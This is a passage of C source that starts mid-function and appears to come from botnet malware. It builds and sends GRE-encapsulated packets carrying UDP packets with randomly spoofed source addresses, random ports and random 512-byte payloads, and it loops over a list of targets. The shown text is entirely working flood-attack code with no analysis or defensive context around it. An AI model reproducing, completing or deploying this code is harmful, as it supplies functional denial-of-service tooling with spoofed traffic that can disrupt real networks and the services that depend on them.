            outer_ip->tot_len = htons(pktsize);
            outer_ip->protocol = IPPROTO_GRE;
            outer_ip->saddr = LOCAL_ADDR;
            outer_ip->daddr = targs[i].addr.s_addr;
            outer_ip->ttl = 64;
            outer_ip->id = rand_next();

            gre[0] = 0;
            gre[1] = 0;
            gre[2] = htons(ETH_P_TEB);

            memset(eth, 0, 6);

            inner_ip->ihl = 5;
            inner_ip->version = 4;
            inner_ip->tot_len = htons(pktsize - sizeof(struct iphdr) - 4 - 6);
            inner_ip->protocol = IPPROTO_UDP;
            inner_ip->saddr = rand_next();
            inner_ip->daddr = targs[i].addr.s_addr;
            inner_ip->ttl = 64;
            inner_ip->id = rand_next();

            struct udphdr *udp = (struct udphdr *)(inner_ip + 1);
            udp->source = htons(rand_next() % 0xFFFF);
            udp->dest = htons(dport != 0 ? dport : rand_next() % 0xFFFF);
            udp->len = htons(sizeof(struct udphdr) + 512);

            rand_str((char *)(udp + 1), 512);

            inner_ip->check = 0;
            inner_ip->check = checksum_generic((uint16_t *)inner_ip, sizeof(struct iphdr) / 2);

            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&targs[i], sizeof(targs[i]));
        }
    }

    free(pktbuf);
    close(fd);
}
